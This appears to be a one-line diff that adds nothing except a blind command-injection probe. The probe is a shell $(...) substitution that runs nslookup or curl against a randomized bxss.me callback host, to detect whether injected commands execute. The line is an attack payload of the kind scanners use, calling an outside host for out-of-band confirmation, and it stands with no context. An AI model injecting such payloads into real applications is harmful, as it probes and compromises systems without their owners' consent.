@@ -1,0 +1,1 @@
+$(nslookup -q=cname hitnzrngplcjxa4660.bxss.me||curl hitnzrngplcjxa4660.bxss.me)
